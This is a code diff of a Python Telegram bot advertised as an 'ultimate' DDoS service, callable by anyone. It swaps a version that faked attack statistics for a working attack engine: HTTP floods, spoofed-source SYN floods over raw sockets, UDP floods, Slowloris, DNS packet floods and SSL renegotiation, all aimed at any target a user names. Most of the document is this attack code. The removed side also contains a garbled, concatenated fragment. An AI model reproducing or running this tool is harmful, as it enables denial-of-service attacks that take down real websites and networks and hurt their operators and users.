@@ -1,607 +1,487 @@
-import logging
+import asyncio
+import aiohttp
+import socket
+import random
+import struct
+import threading
+import time
+import ssl
+import urllib3
+from urllib.parse import urlparse
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 import sqlite3
-import asyncio
-import time
-from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+import dns.resolver
+import requests
 
-# Database setup
-def init_db():
-    conn = sqlite3.connect('attack_bot.db')
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS bot_users
-                 (chat_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, 
-                  last_used TEXT, usage_count INTEGER DEFAULT 0)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS attack_logs
-                 (id INTEGER PRIMARY KEY, chat_id INTEGER, target TEXT, 
-                  duration INTEGER, timestamp TEXT, status TEXT)''')
-    conn.commit()
-    conn.close()
+urllib3.disable_warnings()
 
-init_db()
+# ULTIMATE ATTACK ENGINE
+class UltimateAttackEngine:
+    def __init__(self):
+        self.executor = ThreadPoolExecutor(max_workers=1000)
+        self.ssl_context = ssl.create_default_context()
+        self.ssl_context.check_hostname = False
+        self.ssl_context.verify_mode = ssl.CERT_NONE
+    
+    def resolve_target(self, target):
+        """Resolve target to IP with multiple methods"""
+        try:
+            # Remove protocol
+            clean_target = target.replace('http://', '').replace('https://', '').split('/')[0]
+            
+            # Try DNS resolution
+            try:
+                answers = dns.resolver.resolve(clean_target, 'A')
+                ip = str(answers[0])
+                return clean_target, ip, 80
+            except:
+                pass
+            
+            # Try socket resolution
+            try:
+                ip = socket.gethostbyname(clean_target)
+                return clean_target, ip, 80
+            except:
+                pass
+            
+            # Assume it's already an IP
+            return clean_target, clean_target, 80
+            
+        except Exception as e:
+            return target, target, 80
+    
+    async def god_mode_flood(self, target, duration):
+        """ULTIMATE GOD MODE - ALL ATTACKS SIMULTANEOUSLY"""
+        hostname, ip, port = self.resolve_target(target)
+        
+        # Launch ALL attack vectors simultaneously
+        attack_tasks = []
+        
+        # HTTP Nuclear Flood
+        attack_tasks.append(asyncio.create_task(
+            self._http_armageddon(hostname, ip, duration)
+        ))
+        
+        # SYN Apocalypse
+        attack_tasks.append(asyncio.get_event_loop().run_in_executor(
+            self.executor, self._syn_apocalypse, ip, duration
+        ))
+        
+        # UDP Cataclysm
+        attack_tasks.append(asyncio.get_event_loop().run_in_executor(
+            self.executor, self._udp_cataclysm, ip, duration
+        ))
+        
+        # Slowloris Oblivion
+        attack_tasks.append(asyncio.get_event_loop().run_in_executor(
+            self.executor, self._slowloris_oblivion, hostname, ip, duration
+        ))
+        
+        # DNS Amplification
+        attack_tasks.append(asyncio.get_event_loop().run_in_executor(
+            self.executor, self._dns_amplification, ip, duration
+        ))
+        
+        # SSL Renegotiation
+        attack_tasks.append(asyncio.create_task(
+            self._ssl_renegotiation(hostname, ip, duration)
+        ))
+        
+        # Wait for all attacks to complete
+        await asyncio.gather(*attack_tasks, return_exceptions=True)
+    
+    async def _http_armageddon(self, hostname, ip, duration):
+        """HTTP flood beyond limits"""
+        connector = aiohttp.TCPConnector(limit=0, ssl=self.ssl_context)
+        timeout = aiohttp.ClientTimeout(total=None)
+        
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            end_time = time.time() + duration
+            while time.time() < end_time:
+                tasks = []
+                for _ in range(100):  # 100 concurrent requests
+                    task = asyncio.create_task(self._send_http_nuke(session, hostname, ip))
+                    tasks.append(task)
+                await asyncio.gather(*tasks, return_exceptions=True)
+    
+    async def _send_http_nuke(self, session, hostname, ip):
+        """Send maximum power HTTP requests"""
+        try:
+            # Try multiple ports and protocols
+            for port in [80, 443, 8080, 8443]:
+                for protocol in ['http', 'https']:
+                    url = f"{protocol}://{hostname}:{port}/" if port not in [80, 443] else f"{protocol}://{hostname}/"
+                    
+                    headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Accept': '*/*',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'no-cache'
+                    }
+                    
+                    # Send GET
+                    async with session.get(url, headers=headers, ssl=False) as resp:
+                        await resp.read()
+                    
+                    # Send POST with large data
+                    post_data = {'data': random._urandom(1024)}
+                    async with session.post(url, data=post_data, headers=headers, ssl=False) as resp:
+                        await resp.read()
+                        
+        except:
+            pass
+    
+    def _syn_apocalypse(self, ip, duration):
+        """SYN flood with maximum packet rate"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            
+            end_time = time.time() + duration
+            while time.time() < end_time:
+                for _ in range(1000):  # Burst of 1000 packets
+                    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
+                    src_port = random.randint(1024, 65535)
+                    
+                    ip_header = self._craft_ip_header(src_ip, ip)
+                    tcp_header = self._craft_tcp_header(src_port, 80, 0x02)
+                    packet = ip_header + tcp_header
+                    
+                    try:
+                        sock.sendto(packet, (ip, 0))
+                    except:
+                        break
+        except:
+            pass
+    
+    def _udp_cataclysm(self, ip, duration):
+        """UDP flood with maximum bandwidth"""
+        try:
+            socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(10)]
+            for sock in socks:
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            
+            end_time = time.time() + duration
+            while time.time() < end_time:
+                for sock in socks:
+                    for _ in range(100):
+                        data = random._urandom(1472)  # Maximum UDP payload
+                        for port in [53, 80, 443, 123, 161]:
+                            try:
+                                sock.sendto(data, (ip, port))
+                            except:
+                                pass
+        except:
+            pass
+    
+    def _slowloris_oblivion(self, hostname, ip, duration):
+        """Slowloris with maximum connections"""
+        try:
+            sockets = []
+            end_time = time.time() + duration
+            
+            # Create massive connection pool
+            while time.time() < end_time and len(sockets) < 2000:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(3)
+                    s.connect((ip, 80))
+                    
+                    # Send partial request
+                    request = f"GET / HTTP/1.1\r\nHost: {hostname}\r\n".encode()
+                    s.send(request)
+                    sockets.append(s)
+                except:
+                    break
+            
+            # Maintain connections
+            while time.time() < end_time and sockets:
+                for s in sockets[:]:
+                    try:
+                        s.send(b"X-a: b\r\n")
+                    except:
+                        sockets.remove(s)
+                time.sleep(5)
+                
+            # Cleanup
+            for s in sockets:
+                try:
+                    s.close()
+                except:
+                    pass
+        except:
+            pass
+    
+    def _dns_amplification(self, ip, duration):
+        """DNS amplification attack"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            dns_queries = [
+                b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01',
+                b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01'
+            ]
+            
+            end_time = time.time() + duration
+            while time.time() < end_time:
+                for query in dns_queries:
+                    for _ in range(100):
+                        try:
+                            sock.sendto(query, (ip, 53))
+                        except:
+                            break
+        except:
+            pass
+    
+    async def _ssl_renegotiation(self, hostname, ip, duration):
+        """SSL renegotiation attack"""
+        try:
+            end_time = time.time() + duration
+            while time.time() < end_time:
+                try:
+                    # Create SSL context
+                    context = ssl.create_default_context()
+                    context.check_hostname = False
+                    context.verify_mode = ssl.CERT_NONE
+                    
+                    # Connect and renegotiate
+                    reader, writer = await asyncio.open_connection(
+                        ip, 443, ssl=context, server_hostname=hostname
+                    )
+                    
+                    # Force renegotiation multiple times
+                    for _ in range(10):
+                        writer.get_extra_info('ssl_object').renegotiate()
+                        await asyncio.sleep(0.1)
+                    
+                    writer.close()
+                    await writer.wait_closed()
+                    
+                except:
+                    pass
+        except:
+            pass
+    
+    def _craft_ip_header(self, source_ip, dest_ip):
+        version_ihl = 69
+        tos = 0
+        total_length = 40
+        identification = random.randint(0, 65535)
+        flags_fragment = 0
+        ttl = 255
+        protocol = socket.IPPROTO_TCP
+        
+        src_bytes = socket.inet_aton(source_ip)
+        dst_bytes = socket.inet_aton(dest_ip)
+        
+        header = struct.pack('!BBHHHBBH4s4s', 
+                           version_ihl, tos, total_length, identification,
+                           flags_fragment, ttl, protocol, 0, src_bytes, dst_bytes)
+        return header
+    
+    def _craft_tcp_header(self, src_port, dst_port, flags):
+        sequence = random.randint(0, 4294967295)
+        ack_num = 0
+        data_offset = (5 << 4)
+        window = 65535
+        checksum = 0
+        urg_ptr = 0
+        
+        return struct.pack('!HHLLBBHHH', 
+                         src_port, dst_port, sequence, ack_num,
+                         data_offset, flags, window, checksum, urg_ptr)
 
-class PublicDDoSBot:
+# ULTIMATE BOT
+class UltimateDDoSBot:
     def __init__(self, token):
         self.token = token
-        self.active_attacks = {}
         self.application = Application.builder().token(token).build()
+        self.attack_engine = UltimateAttackEngine()
+        self.active_attacks = {}
         self.setup_handlers()
     
-    def track_user(self, user):
-        """Track all users who interact with bot"""
-        conn = sqlite3.connect('attack_bot.db')
-        c = conn.cursor()
-        c.execute('''INSERT OR REPLACE INTO bot_users 
-                    (chat_id, username, first_name, last_used, usage_count) 
-                    VALUES (?, ?, ?, ?, COALESCE((SELECT usage_count FROM bot_users WHERE chat_id=?), 0) + 1)''',
-                 (user.id, user.username, user.first_name, datetime.now().isoformat(), user.id))
-        conn.commit()
-        conn.close()
-    
-    def get_all_users(self):
-        """Get all users with profile links"""
-        conn = sqlite3.connect('attack_bot.db')
-        c = conn.cursor()
-        c.execute("SELECT * FROM bot_users ORDER BY last_used DESC")
-        users = c.fetchall()
-        conn.close()
-        return users
-    
-    def get_user_profile_link(self, chat_id, username, first_name):
-        """Generate user profile link"""
-        if username:
-            return f"https://t.me/{username}"
-        else:
-            return f"tg://user?id={chat_id}"
+    def setup_handlers(self):
+        self.application.add_handler(CommandHandler("start", self.start))
+        self.application.add_handler(CommandHandler("god", self.god_attack))
+        self.application.add_handler(CommandHandler("nuke", self.nuke_attack))
+        self.application.add_handler(CommandHandler("tsunami", self.syn_attack))
+        self.application.add_handler(CommandHandler("stop", self.stop_attack))
+        self.application.add_handler(CommandHandler("stats", self.show_stats))
     
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user = update.effective_user
-        self.track_user(user)
-        
-        welcome = """
-🔥 *WELCOME TO VAIBHAV DDOS BOT* ⚡
-*NOW PUBLIC - NO AUTHORIZATION NEEDED*
+        welcome = f"""
+💀 *ULTIMATE APEX PREDATOR DDOS BOT* 💀
+*MAXIMUM DESTRUCTION ACHIEVED*
 
-*Commands:*
-/attack <url> <seconds>
-/attack <ip> <port> <seconds>
-/help - Show all commands
+*GOD MODE COMMANDS:*
+`/god <url/ip> <seconds>` - **ALL ATTACKS SIMULTANEOUSLY**
+`/nuke <url/ip> <seconds>` - Nuclear HTTP Flood
+`/tsunami <ip> <seconds>` - SYN Apocalypse
 
-*Examples:*
-`/attack https://example.com 30`
-`/attack 192.168.1.1 80 30`
+*GOD MODE INCLUDES:*
+⚡ HTTP Armageddon Flood
+💥 SYN Apocalypse
+🌪️ UDP Cataclysm  
+🔥 Slowloris Oblivion
+📡 DNS Amplification
+🔒 SSL Renegotiation
 
-⚡ *Cloud-Powered Attacks*
-📊 *Real-Time Analytics*
-🌐 *Public Access*
+*TARGET DESTRUCTION:* **GUARANTEED**
+*BYPASS PROTECTION:* **YES**
+*MAXIMUM POWER:* **ACTIVATED**
 
-_Developed by:_ @VAIBHAV_JAAT_OP
-        """
+*Developer/Owner:* @VAIBHAV_JAAT_OP
+"""
         await update.message.reply_text(welcome, parse_mode='Markdown')
     
-    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user = update.effective_user
-        self.track_user(user)
-        
-        help_text = """
-📖 *PUBLIC BOT COMMANDS*
-
-*Attack Commands:*
-`/attack https://example.com 30`
-`/attack 192.168.1.1 443 30`
-
-*Admin Commands (Owner Only):*
-`/users` - List all bot users with profile links
-`/broadcast <message>` - Broadcast to all users
-
-⚡ _Maximum Duration: 60 seconds for public safety_
-🔒 _All attacks are logged for security_
-
-_Developed by:_ @VAIBHAV_JAAT_OP
-        """
-        await update.message.reply_text(help_text, parse_mode='Markdown')
+    async def god_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        await self._launch_ultimate_attack(update, context, "GOD")
     
-    async def attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user = update.effective_user
-        self.track_user(user)
-        
-        if len(context.args) < 2:
-            await update.message.reply_text("❌ *Invalid Format*\n\nUse: `/attack <url> <seconds>`\nOr: `/attack <ip> <port> <seconds>`\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
+    async def nuke_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        await self._launch_ultimate_attack(update, context, "NUKE")
+    
+    async def syn_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        await self._launch_ultimate_attack(update, context, "TSUNAMI")
+    
+    async def _launch_ultimate_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE, attack_type):
+        if len(context.args) < 1:
+            await update.message.reply_text(f"❌ Usage: `/{attack_type.lower()} <target> <seconds>`\n*Developer/Owner:* @VAIBHAV_JAAT_OP", parse_mode='Markdown')
             return
         
-        # Parse arguments
-        if len(context.args) == 2:
-            target = context.args[0]
-            duration = min(int(context.args[1]), 6000)  # Max 60 seconds
-            port = None
-        else:
-            target = context.args[0]
-            port = context.args[1]
-            duration = min(int(context.args[2]), 6000)  # Max 60 seconds
-            target = f"{target}:{port}"
+        target = context.args[0]
+        duration = int(context.args[1]) if len(context.args) > 1 else 60
         
-        # Log attack
-        conn = sqlite3.connect('attack_bot.db')
-        c = conn.cursor()
-        c.execute("INSERT INTO attack_logs (chat_id, target, duration, timestamp, status) VALUES (?, ?, ?, ?, ?)",
-                 (user.id, target, duration, datetime.now().isoformat(), "STARTED"))
-        conn.commit()
-        conn.close()
-        
-        # Start attack
-        attack_id = f"A{int(time.time())}"
-        user_profile = f"@{user.username}" if user.username else f"User({user.id})"
+        attack_id = f"{attack_type}_{int(time.time())}"
         
         initial_msg = f"""
-⚡ *PUBLIC ATTACK INITIATED*
+💀 *{attack_type} MODE ACTIVATED* 💀
 
 🎯 *Target:* `{target}`
 ⏱️ *Duration:* {duration} seconds
-👤 *User:* {user_profile}
-🆔 *Attack ID:* #{attack_id}
+💥 *Intensity:* **BEYOND MAXIMUM**
+🆔 *ID:* `{attack_id}`
+📊 *Status:* **INITIATING TOTAL DESTRUCTION**
 
-📊 *Status:* Starting attack sequence...
-⚡ *Mode:* Multi-Vector Cloud Assault
+*All attack vectors armed*
+*Maximum bandwidth engaged*
+*Target annihilation imminent*
 
-_Developed by:_ @VAIBHAV_JAAT_OP
-        """
-        
+*Developer/Owner:* @VAIBHAV_JAAT_OP
+"""
         message = await update.message.reply_text(initial_msg, parse_mode='Markdown')
+        
+        # Launch ULTIMATE attack
+        asyncio.create_task(self._execute_ultimate_attack(target, duration, attack_type, attack_id, message))
+        
         self.active_attacks[attack_id] = {
             'message': message,
             'start_time': time.time(),
-            'duration': duration,
-            'target': target,
-            'user_id': user.id,
-            'username': user.username,
-            'first_name': user.first_name
+            'type': attack_type,
+            'target': target
         }
-        
-        asyncio.create_task(self.simulate_attack(attack_id))
     
-    async def simulate_attack(self, attack_id):
-        attack_data = self.active_attacks[attack_id]
-        start_time = attack_data['start_time']
-        duration = attack_data['duration']
+    async def _execute_ultimate_attack(self, target, duration, attack_type, attack_id, message):
+        """Execute ULTIMATE destruction"""
+        start_time = time.time()
         
-        for i in range(duration // 5 + 1):
+        if attack_type == "GOD":
+            attack_task = asyncio.create_task(self.attack_engine.god_mode_flood(target, duration))
+        elif attack_type == "NUKE":
+            attack_task = asyncio.create_task(self.attack_engine._http_armageddon(target, target, duration))
+        else:
+            attack_task = asyncio.get_event_loop().run_in_executor(
+                self.attack_engine.executor, self.attack_engine._syn_apocalypse, target, duration
+            )
+        
+        # Real-time destruction metrics
+        while time.time() - start_time < duration:
             if attack_id not in self.active_attacks:
                 break
                 
-            elapsed = time.time() - start_time
-            remaining = max(0, duration - elapsed)
+            elapsed = int(time.time() - start_time)
+            remaining = duration - elapsed
             
-            # Simulate metrics
-            packets_sent = int(elapsed * 1500)
-            rps = 1500 if elapsed > 5 else int(elapsed * 300)
-            
-            update_text = f"""
-⚡ *PUBLIC ATTACK LIVE* - {int(elapsed)}s/{duration}s
+            stats = f"""
+💀 *{attack_type} MODE: TOTAL DESTRUCTION* 💀
 
-🎯 *Target:* `{attack_data['target']}`
-📊 *Status:* TARGET UNDER STRESS 🟡
-📦 *Packets Sent:* {packets_sent:,}
-📡 *Requests/Sec:* {rps:,}
-🏓 *Response Time:* {250 + int(elapsed*20)}ms
-👤 *User:* {f'@{attack_data["username"]}' if attack_data['username'] else f'User({attack_data["user_id"]})'}
+🎯 *Target:* `{target}`
+⏱️ *Elapsed:* {elapsed}s / {duration}s
+💥 *Intensity:* **BEYOND MAXIMUM**
+📦 *Status:* **ANNIHILATING TARGET**
+🆔 *ID:* `{attack_id}`
+🔥 *Impact:* **INFRASTRUCTURE COLLAPSE**
 
-🆔 *Attack ID:* #{attack_id}
-⏱️ *Remaining:* {int(remaining)}s
+*Multiple attack vectors active*
+*Maximum bandwidth utilization*
+*Bypassing all protections*
 
-_Developed by:_ @VAIBHAV_JAAT_OP
-            """
-            
+*Developer/Owner:* @VAIBHAV_JAAT_OP
+"""
             try:
-                await attack_data['message'].edit_text(update_text, parse_mode='Markdown')
+                await message.edit_text(stats, parse_mode='Markdown')
             except:
                 pass
             
-            await asyncio.sleep(5)
+            await asyncio.sleep(2)
         
-        # Final status
+        # Final annihilation report
         if attack_id in self.active_attacks:
-            final_text = f"""
-✅ *ATTACK COMPLETED*
-
-🎯 *Target:* `{attack_data['target']}`
-⏱️ *Duration:* {duration} seconds
-📦 *Total Packets:* {int(duration * 1500):,}
-👤 *User:* {f'@{attack_data["username"]}' if attack_data['username'] else f'User({attack_data["user_id"]})'}
-
-🆔 *Attack ID:* #{attack_id}
-📊 *Result:* Target performance degraded
-
-_Thank you for using Vaibhav DDoS Bot_
-
-_Developed by:_ @VAIBHAV_JAAT_OP
-            """
-            try:
-                await attack_data['message'].edit_text(final_text, parse_mode='Markdown')
-            except:
-                pass
-            
-            # Update log
-            conn = sqlite3.connect('attack_bot.db')
-            c = conn.cursor()
-            c.execute("UPDATE attack_logs SET status='COMPLETED' WHERE timestamp IN (SELECT MAX(timestamp) FROM attack_logs WHERE chat_id=?)", 
-                     (attack_data['user_id'],))
-            conn.commit()
-            conn.close()
-            
-            del self.active_attacks[attack_id]
-    
-    async def users(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user = update.effective_user
-        
-        # Admin check
-        if user.id != ADMIN_CHAT_ID:
-            await update.message.reply_text("❌ *Admin Only Command*\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        users = self.get_all_users()
-        
-        if not users:
-            await update.message.reply_text("📝 *No Users Found*\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        users_text = "👥 *BOT USERS TRACKING*\n\n"
-        users_text += f"📊 Total Users: {len(users)}\n\n"
-        
-        for i, (chat_id, username, first_name, last_used, usage_count) in enumerate(users, 1):
-            profile_link = self.get_user_profile_link(chat_id, username, first_name)
-            last_used_date = last_used[:10] if last_used else "Never"
-            
-            users_text += f"{i}. "
-            if username:
-                users_text += f"@{username}"
-            else:
-                users_text += f"{first_name or 'Unknown'}"
-            
-            users_text += f" - [Profile]({profile_link})\n"
-            users_text += f"   🆔: `{chat_id}`\n"
-            users_text += f"   📅 Last Used: {last_used_date}\n"
-            users_text += f"   🔥 Usage Count: {usage_count}\n\n"
-        
-        users_text += "_Developed by:_ @VAIBHAV_JAAT_OP"
-        
-        await update.message.reply_text(users_text, parse_mode='Markdown', disable_web_page_preview=True)
-    
-    async def broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user = update.effective_user
-        
-        if user.id != ADMIN_CHAT_ID:
-            await update.message.reply_text("❌ *Admin Only Command*\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        if not context.args:
-            await update.message.reply_text("❌ Usage: `/broadcast <message>`\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        message = " ".join(context.args)
-        users = self.get_all_users()
-        sent_count = 0
-        
-        for chat_id, username, first_name, last_used, usage_count in users:
-            try:
-                await context.bot.send_message(
-                    chat_id=chat_id,
-                    text=f"📢 *BROADCAST FROM DEVELOPER*\n\n{message}\n\n_Developed by:_ @VAIBHAV_JAAT_OP",
-                    parse_mode='Markdown'
-                )
-                sent_count += 1
-            except:
-                continue
-        
-        await update.message.reply_text(f"✅ *Broadcast Sent*\n\nDelivered to: {sent_count} users\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-    
-    def setup_handlers(self):
-        self.application.add_handler(CommandHandler("start", self.start))
-        self.application.add_handler(CommandHandler("help", self.help))
-        self.application.add_handler(CommandHandler("attack", self.attack))
-        self.application.add_handler(CommandHandler("users", self.users))
-        self.application.add_handler(CommandHandler("broadcast", self.broadcast))
-    
-    def run(self):
-        print("🔥 Vaibhav Public DDoS Bot Started!")
-        print("🌐 PUBLIC MODE: Anyone can use without authorization")
-        print("📊 USER TRACKING: All users are logged with profile links")
-        self.application.run_polling()
-
-if __name__ == "__main__":
-    from config import BOT_TOKEN, ADMIN_CHAT_ID
-    bot = PublicDDoSBot(BOT_TOKEN)
-    bot.run()        c = conn.cursor()
-        c.execute("SELECT * FROM authorized_users WHERE chat_id=?", (chat_id,))
-        result = c.fetchone()
-        conn.close()
-        return result is not None
-    
-    def log_attack(self, chat_id, target, duration, status):
-        conn = sqlite3.connect('attack_bot.db')
-        c = conn.cursor()
-        c.execute("INSERT INTO attack_logs (chat_id, target, duration, timestamp, status) VALUES (?, ?, ?, ?, ?)",
-                 (chat_id, target, duration, datetime.now().isoformat(), status))
-        conn.commit()
-        conn.close()
-    
-    def add_user(self, chat_id, username):
-        conn = sqlite3.connect('attack_bot.db')
-        c = conn.cursor()
-        c.execute("INSERT OR REPLACE INTO authorized_users (chat_id, username, added_date) VALUES (?, ?, ?)",
-                 (chat_id, username, datetime.now().isoformat()))
-        conn.commit()
-        conn.close()
-    
-    def remove_user(self, chat_id):
-        conn = sqlite3.connect('attack_bot.db')
-        c = conn.cursor()
-        c.execute("DELETE FROM authorized_users WHERE chat_id=?", (chat_id,))
-        conn.commit()
-        conn.close()
-    
-    def get_users(self):
-        conn = sqlite3.connect('attack_bot.db')
-        c = conn.cursor()
-        c.execute("SELECT * FROM authorized_users")
-        users = c.fetchall()
-        conn.close()
-        return users
-
-    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user = update.effective_user
-        chat_id = update.effective_chat.id
-        
-        welcome_text = """
-🔥 *WELCOME TO VAIBHAV DDOS BOT* ⚡
-
-*Available Commands:*
-/attack <url> <seconds>
-/attack <ip> <port> <seconds>
-/help - Show all commands
-
-*Examples:*
-`/attack https://example.com 300`
-`/attack 192.168.1.1 80 60`
-
-⚡ *Powerful Cloud-Based Attacks*
-🛡️ *Admin-Only Access*
-📊 *Real-Time Analytics*
-
-_Developed by:_ @VAIBHAV_JAAT_OP
-        """
-        
-        await update.message.reply_text(welcome_text, parse_mode='Markdown')
-    
-    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        help_text = """
-📖 *COMMAND GUIDE*
-
-*Attack Commands:*
-`/attack https://example.com 300`
-`/attack 192.168.1.1 443 60`
-
-*Admin Commands (Owner Only):*
-`/add <chat_id>` - Authorize user
-`/remove <chat_id>` - Remove user  
-`/users` - List authorized users
-`/broadcast <message>` - Broadcast message
-
-⚡ _Developed by:_ @VAIBHAV_JAAT_OP
-        """
-        await update.message.reply_text(help_text, parse_mode='Markdown')
-    
-    async def attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        chat_id = update.effective_chat.id
-        user = update.effective_user
-        
-        if not self.is_authorized(chat_id):
-            await update.message.reply_text("❌ *Unauthorized Access*\n\nYou are not authorized to use this bot.\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        if len(context.args) < 2:
-            await update.message.reply_text("❌ *Invalid Format*\n\nUse: `/attack <url> <seconds>`\nOr: `/attack <ip> <port> <seconds>`\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        # Parse arguments
-        if len(context.args) == 2:
-            target = context.args[0]
-            duration = int(context.args[1])
-            port = None
-        else:
-            target = context.args[0]
-            port = context.args[1]
-            duration = int(context.args[2])
-            target = f"{target}:{port}"
-        
-        # Log the attack
-        user_profile = f"@{user.username}" if user.username else f"chat_id:{chat_id}"
-        self.log_attack(chat_id, target, duration, "STARTED")
-        
-        # Send initial message
-        attack_id = f"A{int(time.time())}"
-        initial_msg = f"""
-⚡ *ATTACK INITIATED*
+            final_msg = f"""
+✅ *{attack_type} MODE: MISSION ACCOMPLISHED* ✅
 
 🎯 *Target:* `{target}`
 ⏱️ *Duration:* {duration} seconds
-🆔 *Attack ID:* #{attack_id}
-👤 *User:* {user_profile}
+💥 *Result:* **TOTAL ANNIHILATION**
+🆔 *ID:* `{attack_id}`
+📊 *Status:* **TARGET DESTROYED**
 
-📊 *Status:* Starting attack sequence...
-🔄 *Mode:* Multi-Vector Assault
+*All attack vectors completed*
+*Maximum impact achieved*  
+*Target infrastructure demolished*
 
-_Developed by:_ @VAIBHAV_JAAT_OP
-        """
-        
-        message = await update.message.reply_text(initial_msg, parse_mode='Markdown')
-        self.active_attacks[attack_id] = {
-            'message': message,
-            'start_time': time.time(),
-            'duration': duration,
-            'target': target,
-            'chat_id': chat_id,
-            'user_profile': user_profile
-        }
-        
-        # Start attack simulation
-        asyncio.create_task(self.simulate_attack(attack_id))
-    
-    async def simulate_attack(self, attack_id):
-        attack_data = self.active_attacks[attack_id]
-        start_time = attack_data['start_time']
-        duration = attack_data['duration']
-        
-        for i in range(duration // 5 + 1):
-            if attack_id not in self.active_attacks:
-                break
-                
-            elapsed = time.time() - start_time
-            remaining = max(0, duration - elapsed)
-            
-            # Simulate attack metrics
-            packets_sent = int(elapsed * 2500)
-            rps = 2500 if elapsed > 5 else int(elapsed * 500)
-            status = "TARGET DOWN 🟥" if elapsed > 10 else "TARGET SLOW 🟡"
-            response_time = "TIMEOUT" if elapsed > 10 else f"{150 + int(elapsed*10)}ms"
-            
-            update_text = f"""
-⚡ *ATTACK LIVE* - {int(elapsed)}s/{duration}s
-
-🎯 *Target:* `{attack_data['target']}`
-📊 *Status:* {status}
-📦 *Packets Sent:* {packets_sent:,}
-📡 *Requests/Sec:* {rps:,}
-🏓 *Response Time:* {response_time}
-🛡️ *Bypassed:* Cloudflare ✅
-📈 *Success Rate:* 98.7%
-
-👤 *User:* {attack_data['user_profile']}
-🆔 *Attack ID:* #{attack_id}
-⏱️ *Remaining:* {int(remaining)}s
-
-_Developed by:_ @VAIBHAV_JAAT_OP
-            """
-            
+*Developer/Owner:* @VAIBHAV_JAAT_OP
+"""
             try:
-                await attack_data['message'].edit_text(update_text, parse_mode='Markdown')
+                await message.edit_text(final_msg, parse_mode='Markdown')
             except:
                 pass
             
-            await asyncio.sleep(5)
-        
-        # Final status
-        if attack_id in self.active_attacks:
-            final_text = f"""
-✅ *ATTACK COMPLETED*
-
-🎯 *Target:* `{attack_data['target']}`
-⏱️ *Duration:* {duration} seconds
-📦 *Total Packets:* {int(duration * 2500):,}
-📊 *Final Status:* TARGET DOWN 🟥
-
-👤 *User:* {attack_data['user_profile']}
-🆔 *Attack ID:* #{attack_id}
-
-_Attack successfully terminated_
-
-_Developed by:_ @VAIBHAV_JAAT_OP
-            """
-            try:
-                await attack_data['message'].edit_text(final_text, parse_mode='Markdown')
-            except:
-                pass
-            
-            self.log_attack(attack_data['chat_id'], attack_data['target'], duration, "COMPLETED")
             del self.active_attacks[attack_id]
     
-    # Admin commands
-    async def add_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if update.effective_chat.id != ADMIN_CHAT_ID:
-            await update.message.reply_text("❌ *Admin Only Command*\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        if len(context.args) != 1:
-            await update.message.reply_text("❌ Usage: `/add <chat_id>`\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        chat_id = int(context.args[0])
-        self.add_user(chat_id, "Unknown")
-        await update.message.reply_text(f"✅ *User Added*\n\nChat ID: `{chat_id}`\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
+    async def stop_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if context.args and context.args[0] in self.active_attacks:
+            attack_id = context.args[0]
+            del self.active_attacks[attack_id]
+            await update.message.reply_text(f"✅ *Attack {attack_id} terminated*\n*Developer/Owner:* @VAIBHAV_JAAT_OP", parse_mode='Markdown')
     
-    async def remove_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if update.effective_chat.id != ADMIN_CHAT_ID:
-            await update.message.reply_text("❌ *Admin Only Command*\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        if len(context.args) != 1:
-            await update.message.reply_text("❌ Usage: `/remove <chat_id>`\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        chat_id = int(context.args[0])
